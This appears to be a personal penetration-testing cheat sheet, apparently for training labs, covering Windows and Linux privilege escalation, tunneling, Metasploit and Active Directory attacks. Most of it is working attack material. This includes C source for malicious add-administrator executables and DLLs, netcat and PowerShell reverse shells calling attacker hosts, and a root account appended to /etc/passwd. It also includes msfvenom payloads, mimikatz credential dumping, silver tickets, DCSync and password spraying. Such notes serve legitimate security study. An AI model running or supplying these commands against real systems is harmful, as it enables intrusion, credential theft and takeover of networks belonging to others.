+PS > Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+(installed win64 applications)
+PS > Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+(installed win32 applications)
+(also view \Downloads and \Program Files directories)
+PS > Get-Process
+PS > Get-ChildItem -Path C:\inetpub -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+PS > Get-ChildItem -Path C:\Users -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.exe,*.bat,*.ps1 -File -Recurse -Force -ErrorAction SilentlyContinue
+PS > Get-ChildItem -Recurse -File | Select-String ".{0,20}password.{0,20}" | ForEach-Object { $_.Matches.Value }
+PS > Get-ChildItem -Recurse -File | Select-String -Pattern ".{0,20}password.{0,20}" -AllMatches | ForEach-Object { $_.Matches | ForEach-Object { "$($_.Path): $($_.Value)"}}
+PS > Get-ChildItem -Recurse -File -Exclude *.js,*.dll | Select-String ".{0,50}password.{0,50}" | ForEach-Object { $_.Matches.Value }
+PS > Get-History
+PS > (Get-PSReadlineOption).HistorySavePath
+PS > Get-ChildItem C:\ -Recurse -Force -ErrorAction SilentlyContinue -Filter ConsoleHost_history.txt
+type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+type C:\Users\Public\Transcripts\transcript01.txt		(if user used Start-Transcript command)
+
+PS > runas /user:backupadmin cmd		(run commands as a different user)
+PS > $password = ConvertTo-SecureString "Flowers1" -AsPlainText -Force
+     $cred = New-Object System.Management.Automation.PSCredential("medtech\joe", $password)
+     Enter-PSSession -ComputerName WEB02 -Credential $cred				[login with $cred]
+
+evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"			[powershell remoting]
+
+[Automated Tools]
+https://github.com/GhostPack/Seatbelt
+https://github.com/411Hall/JAWS			(If WinPeas is blocked)
+cp /usr/share/peass/winpeas/winPEASx64.exe .
+PS > iwr -uri http://192.168.45.192/winPEASx64.exe -Outfile winPEAS.exe		(we are serving from http)
+.\winPEAS.exe
+PS > iwr -uri http://192.168.45.155/Seatbelt.exe -Outfile seatbelt.exe
+.\seatbelt.exe -group=all
+
+iwr -uri http://192.168.45.155/adduser.exe -Outfile adduser.exe
+
+[Service Binary Hijacking]
+PS > Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+[list running services]
+icacls "C:\xampp\apache\bin\httpd.exe" 			(show permissions)
+[compile malicious add user code:]
+#include <stdlib.h>
+int main ()
+{
+  int i;
+  i = system ("net user dave4 password123! /add");
+  i = system ("net localgroup administrators dave4 /add");
+  i = system ("net localgroup administrators tim /add");
+  return 0;
+}
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+PS > iwr -uri http://192.168.45.155/adduser.exe -Outfile adduser.exe
+     move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
+     move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
+     net stop mysql						(to restart the service)
+     shutdown /r /t 0						(to reboot to start, if we don't have priv to restart the svc)
+[automated priv esc:]
+cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
+PS > iwr -uri http://192.168.45.155/PowerUp.ps1 -Outfile PowerUp.ps1
+     powershell -ep bypass
+     . .\PowerUp.ps1						(dot sourced execution)
+     Get-ModifiableServiceFile
+     (then, use the AbuseFunction given by PowerUp)
+
+[DLL Hijacking]
+[Malicious DLL code:]
+#include <stdlib.h>
+#include <windows.h>
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+  	    i = system ("net user dave3 password123! /add");
+  	    i = system ("net localgroup administrators dave3 /add");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+sudo apt install mingw-w64
+x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll     (cross-compile the malicious dll)
+PS > iwr -uri http://192.168.45.228/TextShaping.dll -OutFile 'C:\Services\EnterpriseServiceOptional.dll'
+Get-Process -Id 2820 | Select-Object -ExpandProperty Modules 		(find loaded modules/dlls from pwsh)
+strings EnterpriseService.exe | grep -i "\.dll"
+strings EnterpriseService.exe | grep -Ei "LoadLibrary|GetProcAddress" (download the service on your kali machine,inspect dll locally!)
+
+[Unquoted Service Paths]
+C:\Program.exe
+C:\Program Files\My.exe
+C:\Program Files\My Program\My.exe
+C:\Program Files\My Program\My service\service.exe		[Interpreted paths for an unquoted service]
+cmd > wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """ 
+(list services that are not windows default and is unquoted, run it in cmd not pwsh)
+PS > Start-Service GammaService
+     Stop-Service GammaService					(check restart permissions..)
+     iwr -uri http://192.168.45.228/adduser.exe -Outfile ReynhSurveillance.exe
+     copy .\ReynhSurveillance.exe 'C:\Enterprise Software\Monitoring Solution\Surveillance.exe'
+     Start-Service GammaService
+(identify with Powerup:)
+PS > . .\PowerUp.ps1
+     Get-UnquotedService
+     Write-ServiceBinary -Name 'ReynhSurveillance' -Path "C:\Enterprise Software\Monitoring Solution\Surveillance.exe"
+(Original path: C:\Enterprise Software\Monitoring Solution\Surveillance Apps\ReynhSurveillance.exe)
+
+[POWERUP NOTE: The default behavior is to create a new local user called john with the password Password123! and add it to the local Administrators group. Also, you still need to restart services manually.]
+
+[Scheduled Tasks Exploits]
+schtasks /query /fo LIST /v	(view all scheduled tasks)
+schtasks /query /fo LIST /v | findstr /b /c:"TaskName:" | findstr /i /v "Microsoft" (filter out Microsoft)
+(then proceed as same as service binary etc hijacking)
+
+[Kernel Exploits]
+systeminfo
+Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
+(enumerate the version of windows and security patches installed)
+.\CVE-2023-29360.exe
+
+[SeImpersonatePrivilege]
+(Other privesc attack vectors: SeBackupPrivilege, SeAssignPrimaryToken, SeLoadDriver, and SeDebug)
+wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
+./SigmaPotato.exe --revshell <ip_addr> <port>
+.\potato.exe "net localgroup administrators eric.wallows /add" 
+(instead of adding a new local user, it is much better to make an existing domain user admin)
+.\SigmaPotato "net user dave4 password123 /add"
+.\SigmaPotato "net localgroup Administrators dave4 /add"
+.\potato.exe 'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f'		(disable UAC Token filtering to be able to psexec!!!)
+
+___________________________________________________________________________________________________________
+
+LINUX PRIVILEGE ESCALATION
+
+cat /etc/passwd
+sudo -l					(list sudo capabilities for the user)
+uname -a				(enumerate linux kernel version)
+ps aux					(ps auxww for no truncation)
+ip a
+routel
+ss -anp					(listening ports)
+cat /etc/iptables/rules.v4		(firewall rules)
+dpkg -l					(list installed software)
+find / -writable 2>/dev/null		(see all files and folders writeable by user)
+cat /etc/fstab and mount		(discover unmounted partitions)
+lsmod and /sbin/modinfo {modulename} 	(loaded kernel modules)
+find / -perm -u=s -type f 2>/dev/null   (find files with SUID bit set)
+sudo tcpdump -i lo -A | grep "pass"	(capture traffic)
+env and cat .bashrc			[env variables that might contain creds sometimes]
+grep -Rni -o '.\{0,20\}password.\{0,20\}' .	(inside web directories)
+
+[Automated Tools]
+./unix-privesc-check standard 
+https://github.com/rebootuser/LinEnum
+https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
+
+su - root 	(elevate the root user with the password)
+crunch 6 6 -t Password%%% > wordlist		(generate a wordlist for brute-force attack. set the minimum and maximum length to 6 characters, -t parameter for pattern > Lab followed by three digits)
+hydra -l eve -P wordlist  192.168.112.214 -t 4 ssh
+sudo -i		(elevate to root with an admin user password)
+
+[cron jobs]
+ls -lah /etc/cron*
+cat /etc/cron.hourly/customscript		(how to view the detailed cronjob)
+sudo crontab -l
+grep "CRON" /var/log/syslog
+ls -lah /home/joe/.scripts/user_backups.sh	(check permissions on a file)
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> user_backups.sh
+(bash reverse shell one-liner, stable i/o)
+
+[/etc/passwd]
+openssl passwd w00t	(create a hash for passwd 'w00t')
+echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd	(abuse writeable /etc/passwd file)
+su root2
+
+[SUID binaries]
+find / -perm -u=s -type f 2>/dev/null
+find /home/joe/Desktop -exec "/usr/bin/bash" -p \; (abusing incorrectly suid set find command to start root priv shell)
+(search the binary on gtfobins)
+
+[Linux capabilities]
+/usr/sbin/getcap -r / 2>/dev/null	(enumerate capabilities)
+https://gtfobins.github.io/ 		(list of binaries and how to exploit them)
+					(use CAP_SETUID instructions!)
+
+[sudoers exploits]
+sudo -l 
+(and search the commands on gtfobins)
+
+[Kernel vulnerabilities]
+uname -r, arch, cat /etc/issue				(enumerate OS kernel version)
+searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
+scp cve-2017-16995.c joe@192.168.123.216:		(copy over ssh to the target machine to compile there)
+[run kernel vuln privesc in metasploit]
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf > shell
+scp shell user@target:/tmp
+chmod +x /tmp/shell
+./tmp/shell
+(on metasploit:)
+use exploit/multi/handler
+set payload linux/x64/meterpreter/reverse_tcp
+set LHOST YOUR_IP
+set LPORT 4444
+run
+background
+(then, search and run exploit with this meterpreter session)
+
+_____________________________________________________________________________________________________________________
+
+PORT REDIRECTION AND SSH TUNNELING
+
+ip route							(discover internal subnet)
+
+[Simple Port Forwarding with Socat]
+socat -ddd TCP-LISTEN:2345,fork TCP:10.4.242.215:5432	(on a compromised host, listen on 2345, forward to 10.4.50.215:5432)
+(then we can on our kali machine:)
+psql -h 10.4.242.215 -p 5432 -U postgres			(being forwarded to target postgres machine over 192.168.50.63)
+\c confluence (select db in postgres, \l to list databases)
+(then) select * from cwd_user;
+socat TCP-LISTEN:2222,fork TCP:10.4.242.215:22			(create a port fwd to access ssh)
+(then we can:)
+ssh database_admin@192.168.242.63 -p2222			(192.168.242.63 is where we ran the portfwd, not the end target)
+
+https://gist.github.com/holly/6d52dd9addd3e58b2fd5	[nc tcp port forward.sh, but socat can be downloaded as bin anyways]
+
+[To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to /proc/sys/net/ipv4/conf/[interface]/forwarding]
+
+[SSH Tunneling]
+
+python3 -c 'import pty; pty.spawn("/bin/sh")'			(get a proper shell to run these commands)
+
+[SSH Local Port Forwarding]
+for i in $(seq 1 1024); do nc -zv -w 1 10.4.120.215 $i; done
+for i in $(seq 1 254); do nc -zv -w 1 10.4.120.$i 445; done	[using bash to do a port sweep since nmap is not available]
+ssh -N -L 0.0.0.0:4455:172.16.114.217:4242 database_admin@10.4.114.215	[[LOCAL_IP:]LOCAL_PORT:DEST_IP:DEST_PORT]
+(ssh connected 10.4.50.215 is the middle man here, and 172.16.50.217 is the target, 0.0.0.0 is the compromised host where we started the ssh tunnel)
+(then we can from our kali machine:)
+smbclient -p 4455 -L //192.168.114.63/ -U hr_admin --password=Welcome1234 (from our machine, 192.168.50.63 is where we ran ssh tunnel previously)
+
+[SSH Dynamic Port Forwarding]
+ssh -N -D 0.0.0.0:9999 database_admin@10.4.242.215	[from jump machine 10.4.242.215 to any machine/port within reach]
+tail /etc/proxychains4.conf				[we will use proxychains in our kali machine]
+[Add this line to the end of the conf file, delete default proxy:]
+socks5 192.168.242.63 9999				[192.168.242.63 is the first machine on the chain]
+(or socks4 if socks5 not supported)
+(then)
+proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234		[from our kali machine]
+(172.16.50.217 is the end of the chain, this time we are connecting directly to the target, not the initial foothold as the previous ssh local port forward)
+sudo proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.242.217
+
+[SSH Remote Port Forwarding]				[if inbound traffic is limited by firewall]
+sudo systemctl start ssh				[start an ssh server on your kali machine]
+(set PasswordAuthentication to yes in /etc/ssh/sshd_config)
+ssh -N -R 127.0.0.1:4141:10.4.120.215:4444 kali@192.168.45.169	[from jump machine to target at 10.4.242.215 over our kali ssh server]
+(then)
+psql -h 127.0.0.1 -p 2345 -U postgres			(postgres server is actually at 10.4.242.215)
+
+[SSH Remote Dynamic Port Forwarding]
+ssh -N -R 9999 kali@192.168.45.155
+(and add this line to /etc/proxychains4.conf:)
+socks5 127.0.0.1 9999
+sudo proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.242.64	(note that we are using the internal ip of the target)
+ssh -N -R 9999:10.4.242.215:4444 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null kali@192.168.45.169
+[if ssh password auth does not work]
+
+[sshuttle]
+socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22				     [port redirection on jump box]
+sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24    [ssh to target box through the first compromised host, and subnets we want to tunnel]
+smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
+
+[Port Forwarding with Windows Tools]
+[if openssh exists, ssh commands are the same as nix]
+[from our kali machine, we are serving nc.exe to be downloaded on target machine and used as reverse shell]
+sudo systemctl start apache2
+sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/
+powershell wget -Uri http://192.168.45.169/nc.exe -OutFile C:\Windows\Temp\nc.exe
+nc -nvlp 4446
+C:\Windows\Temp\nc.exe -e cmd.exe 192.168.45.169 9000
+[Plink]			(if ssh not available on target machine)
+[serve plink.exe to the target machine]
+sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
+powershell wget -Uri http://192.168.45.169/plink.exe -OutFile C:\Windows\Temp\plink.exe
+C:\Windows\Temp\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.169
+[set up remote port forward on Plink. second ip is also loopback bc we want to connect to the firewalled rdp port on that host itself, so now we can:]
+xfreerdp3 /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
+cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7
+[if cannot respond to ssh key cache prompt on a non-tty terminal, you can automatically reply -y this way]
+[Netsh] (requires administrator)
+(simple port forward)
+netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.120.64 connectport=4545 connectaddress=10.4.120.215
+netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.120.64 localport=2222 action=allow
+ssh database_admin@192.168.120.64 -p2222		(from our kali machine)
+(to delete the port forward and firewall rule later:)
+netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
+netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
+
+_____________________________________________________________________________________________________________
+
+TUNNELING THROUGH DEEP PACKET INSPECTION
+
+[Http Tunneling with Chisel]
+https://github.com/jpillora/chisel/releases
+sudo cp $(which chisel) /var/www/html/
+wget 192.168.45.169/chisel -O /tmp/chisel && chmod +x /tmp/chisel
+chisel server --port 8080 --reverse 			[start chisel server on kali machine for reverse port forward]
+/tmp/chisel client 192.168.45.169:8080 R:socks > /dev/null 2>&1 &   [client on the jump machine]
+/tmp/chisel client 192.168.45.169:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.45.169:8080/
+(same command with error logging and sending back read log file - that can be read through tcpdump on kali machine)
+sudo tcpdump -nvvvXi tun0 tcp port 8080
+(after establishing chisel proxy we can ssh connect through chisel, using ncat as proxy command:)
+sudo apt install ncat
+ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
+[reverse port forward]
+chisel client 192.168.45.230:8080 R:8008:10.4.50.215:8008	(8080 is just the control port that runs chisel server)
+
+sudo tcpdump -i ens192 udp port 53			[capture filter for tcpdump]
+nslookup exfiltrated-data.feline.corp			[dns request]
+nslookup -type=txt www.feline.corp			[txt record fetch from authorative dns server]
+
+[DNS Tunneling with dnscat2]
+dnscat2-server feline.corp				[start dns server on dns authority machine]
+./dnscat feline.corp					[run dns client on target machine]
+[from dnscat2 server:]
+dnscat2> windows					[show active windows]
+dnscat2> window -i 1
+command (pgdatabase01) 1> ?				[show list of available commands]
+command (pgdatabase01) 1> listen 127.0.0.1:4455 172.16.144.217:4646		[local port forward]
+(0.0.0.0 means everyone, 127.0.0.1 means only self allowed)
+(then on the same machine:)
+smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
+(or on our own kali machine:)
+command (pgdatabase01) 1> listen 0.0.0.0:4455 172.16.144.217:4646		[local port forward]
+smbclient -p 4455 -L //192.168.50.215 -U hr_admin --password=Welcome1234
+
+___________________________________________________________________________________________________________
+
+THE METASPLOIT FRAMEWORK
+
+db_nmap -A 192.168.50.202		[nmap wrapper inside msf]
+search type:auxiliary smb
+use 56
+show options
+set RHOSTS 192.168.50.202
+run
+msf6 auxiliary(scanner/smb/smb_version) > vulns
+
+msf6 auxiliary(scanner/ssh/ssh_login) >			[ssh password brute force auxiliary module]
+				      > set PASS_FILE /usr/share/wordlists/rockyou.txt
+				      > set USERNAME george		(or set USER_FILE)
+
+set payload linux/x64/shell_reverse_tcp
+msf6 exploit(multi/http/apache_normalize_path_rce) > set SSL false		[since our target http server runs on 80]
+show payloads
+meterpreter > help			[show meterpreter commands]
+lcd /home/kali/Downloads		[change local kali working directory]
+download /etc/passwd			
+lcat /home/kali/Downloads/passwd	[cat a file from local kali]
+upload /usr/bin/unix-privesc-check /tmp/
+
+[msfvenom payloads]
+msfvenom -l payloads --platform windows --arch x64	[list payloads for a platform and architecture]
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe
+(then:)
+nc -nvlp 443							[nc can only handle non-staged payloads]
+iwr -uri http://192.168.119.2/nonstaged.exe -Outfile nonstaged.exe
+.\nonstaged.exe
+[for staged payloads, use mfs multi/handler:]
+use multi/handler
+set payload windows/x64/shell/reverse_tcp			[use the exact same port and payload created in msfvenom]
+run
+.\staged.exe							[on target machine]
+
+[php msf rev shell]
+msfvenom -p php/reverse_php LHOST=YOUR_KALI_IP LPORT=4444 -f raw > shell.pHP
+use multi/handler
+set payload php/reverse_php
+run
+curl http://192.168.185.189/meteor/uploads/shell.pHP
+
+[Metasploit Post-Exploitation Features and Modules]
+meterpreter > getsystem					[attemps automated privesc to nt/authority]
+meterpreter > ps
+meterpreter > migrate 8052				[migrate to another process]
+(or:)
+meterpreter > execute -H -f notepad                     (Process 2720 created.)
+meterpreter > migrate 2720
+
+(background to search for post-exploitation modules)
+PS C:\Windows\system32> ^Z	                        [Background channel 1? [y/N]  y]
+meterpreter > bg                                        [[*] Backgrounding session 9...]			
+msf6 exploit(multi/handler) > search UAC
+msf6 exploit(multi/handler) > use exploit/windows/local/bypassuac_sdclt		[elevate token integrity level and bypass UAC]
+msf6 exploit(windows/local/bypassuac_sdclt) > set SESSION 9
+msf6 exploit(windows/local/bypassuac_sdclt) > run
+
+[Extensions]
+meterpreter > getsystem
+meterpreter > load kiwi					[load extensions from inside of the session]
+meterpreter > help					[kiwi:mimikatz extension inside msf]
+meterpreter > creds_msv					(retrieve LM/NTLM creds)
+
+[Pivoting with Metasploit]
+ipconfig
+(We discovered a second interface that has the assigned IP 172.16.5.199. To add a route to a network reachable through a compromised host, we can use route add with the network information and session ID that the route applies to.)
+meterpreter > bg
+msf6 exploit(multi/handler) > route add 172.16.5.0/24 12
+msf6 exploit(multi/handler) > use auxiliary/scanner/portscan/tcp 	[scan for hosts in the second internal subnet]
+msf6 auxiliary(scanner/portscan/tcp) > use exploit/windows/smb/psexec   [smb connection to the newly discovered target..]
+msf6 exploit(windows/smb/psexec) > set SMBUser luiza			[..from pivot]
+msf6 exploit(windows/smb/psexec) > set SMBPass "BoccieDearAeroMeow1!"
+msf6 exploit(windows/smb/psexec) > set RHOSTS 172.16.5.200
+msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/bind_tcp		[must be a bind shell]
+msf6 exploit(windows/smb/psexec) > set LPORT 8000
+msf6 exploit(windows/smb/psexec) > use multi/manage/autoroute		[pivot routes automatically from established session]
+msf6 post(multi/manage/autoroute) > set session 12
+msf6 post(multi/manage/autoroute) > run	
+msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy 	[allows applications outside of the Metasploit Framework to tunnel through the pivot on port 1080 by default]
+msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
+msf6 auxiliary(server/socks_proxy) > set VERSION 5
+msf6 auxiliary(server/socks_proxy) > run -j
+kali@kali:~$ tail /etc/proxychains4.conf
+socks5 127.0.0.1 1080
+sudo proxychains xfreerdp /v:172.16.5.200 /u:luiza
+[or port forward from inside a meterpreter session:]
+msf6 > sessions -i 12
+meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.5.200	[forward port forwarding localhost:3389:172.16.5.200:3389]
+sudo xfreerdp /v:127.0.0.1 /u:luiza
+
+[Resource Scripts]
+[listener.rc:]
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter_reverse_https
+set LHOST 192.168.119.4
+set LPORT 443
+set AutoRunScript post/windows/manage/migrate 
+set ExitOnSession false
+run -z -j
+[then:]
+sudo msfconsole -r listener.rc
+ls -l /usr/share/metasploit-framework/scripts/resource		[already provided resource scripts]
+
+_________________________________________________________________________________________________________
+
+
+ACTIVE DIRECTORY ENUMERATION
+
+xfreerdp /u:stephanie /d:corp.com /v:192.168.118.75		(connecting to a domain user)
+net user /domain and net user jeffadmin /domain and net group /domain
+smbclient -N -L //192.168.112.72/ or net view \\web04		[enumerate smb shares]
+
+[Manual enumeration script for users/groups:]
+function LDAPSearch {
+    param ([string]$LDAPQuery)
+    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
+    $DistinguishedName = ([adsi]'').distinguishedName
+    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
+    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
+    return $DirectorySearcher.FindAll()
+}
+Import-Module .\function.ps1
+LDAPSearch -LDAPQuery "(samAccountType=805306368)"		(search for user objects with this script)
+LDAPSearch -LDAPQuery "(objectclass=group)"
+
+[PowerView]
+Import-Module .\PowerView.ps1
+Get-NetDomain
+Get-NetUser
+Get-NetGroup "Sales Department" | select member
+Get-NetComputer | select operatingsystem,dnshostname,operatingsystemversion
+Find-LocalAdminAccess		[scans the network to determine if our current user has administrative permissions on any computers in the domain]
+Get-NetSession -ComputerName files04 -Verbose  or .\PsLoggedon.exe \\files04	[scan for any logged in users]
+Get-NetUser -SPN | select samaccountname,serviceprincipalname or setspn -L stephanie		[enumerate services]
+Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights				
+"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName	[enumerate who has GenericAll permissions to an object (object is Management Department group in this case)]
+net group "Management Department" stephanie /add /domain	[add an user to a group if she has appropriate permissions]
+Find-DomainShare						[-CheckShareAccess to display shares only available to us]
+ls \\dc1.corp.com\sysvol\					[go to sysvol domain share]
+cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
+gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"	[decrypt GPP stored passwords in the policy file]
+$pass = ConvertTo-SecureString 'NewPasswordHere!' -AsPlainText -Force
+Set-DomainUserPassword -Identity Robert -AccountPassword $pass		[change pass to an user which we have GenericAll]
+
+[SharpHound]
+Import-Module .\Sharphound.ps1
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "capstone"
+[BloodHound]
+sudo apt install neo4j npm nodejs bloodhound
+sudo bloodhound-setup
+http://localhost:7474		[user:neo4j pass:neo4j]
+sudo nano /etc/bhapi/bhapi.json (to update new neo4j pass and see bloodhound credentials)
+bloodhound
+[then upload the database zip that SharpHound collected]
+[run Shortest Paths to Domain Admins from Owned Principals]
+
+xfreerdp /drive:kali,/home/kali /clipboard				[mount a drive and clipboard access in xfreerdp]
+
+________________________________________________________________________________________________________________________
+
+ATTACKING ACTIVE DIRECTORY
+
+crackmapexec smb 192.168.112.0/24 -u capstone3users.txt -p 'HomeTaping199!' -d corp.com --continue-on-success		[password spraying accross all domain machines to find P0wn3d!]
+
+.\mimikatz.exe
+privilege::debug
+crypto::capi or crypto::cng (patch the CryptoAPI function with crypto::capi or KeyIso service with crypto::cng,making non-exportable keys exportable for certificates)
+
+[Password Attacks]
+net accounts 		(password length and lockout policy)
+https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1
+.\Spray-Passwords.ps1 -Pass Nexus123! -Admin 		(or -File to use password wordlist)
+crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success (--users or --rid-brute to enumerate users)
+.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
+
+[AS-REP Roasting]
+[identify users with the enabled AD user account option Do not require Kerberos preauthentication:]
+[.\PowerView.ps1] Get-DomainUser -PreauthNotRequired
+impacket-GetNPUsers -dc-ip 192.168.50.70 corp.com/pete	
+[Alternatively, we can modify the User Account Control value of the user to not require Kerberos preauthentication if we have GenericAll or GenericWrite permission]
+[with impacket:]
+impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete		(with pete's creds)
+hashcat -hh | grep -i "Kerberos"
+sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force
+[with Rubeus:]
+.\Rubeus.exe asreproast /nowrap
+sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force
+
+[Kerberoasting] (Targets Service Accounts)
+[with Rubeus, from windows:]
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force [correct hashcat mode is 13100 | Kerberos 5, etype 23, TGS-REP]
+[with impacket, from linux:]
+sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
+[Alternatively, if you have GenericAll or GenericWrite permissions over another user, you can set SPN on that user and continue
+Kerberoasting their password, instead of changing their password directly:]
+Set-DomainObject -Identity "robert" -Add @{servicePrincipalName="http/robert"}	[on PowerView]
+
+[Silver Tickets] (Targets Service Accounts)
+.\mimikatz.exe				[run powershell as administrator]
+privilege::debug
+sekurlsa::logonpasswords		[first, retrieve SPN password hash (NTLM hash of iis_service)]
+whoami /user				[extract SID without the RID (last 4 digits after the dash]
+kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin			[rc4 parameter is the NTLM hash]
+PS > klist				[confirm the cached ticket to the memory]
+iwr -UseDefaultCredentials http://web04 [now we can access the restricted service]
+
+[Domain Controller Synchronization] (Targets Anyone, Requires Domain Admin)
+[from mimikatz:]
+.\mimikatz.exe
+lsadump::dcsync /user:corp\dave			[dave is the user we want to dump NTLM hash of]
+hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force
+lsadump::dcsync /user:corp\Administrator
+[from impacket:]
+impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
+
+________________________________________________________________________________________________________________
+
+LATERAL MOVEMENT IN ACTIVE DIRECTORY
+
+[WMI]		(need credentials of an user from local admin group in the target machine)
+(python script to encode and print powershell reverse shell:)
+import sys
+import base64
+payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.229",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
+print(cmd)
+(pwsh:) (we need a target machine 192.168.232.73 and a local admin jen and her password. we can be on another machine and another user)
+PS > $username = 'jen';
+PS > $password = 'Nexus123!';
+PS > $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+PS > $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+PS > $Options = New-CimSessionOption -Protocol DCOM
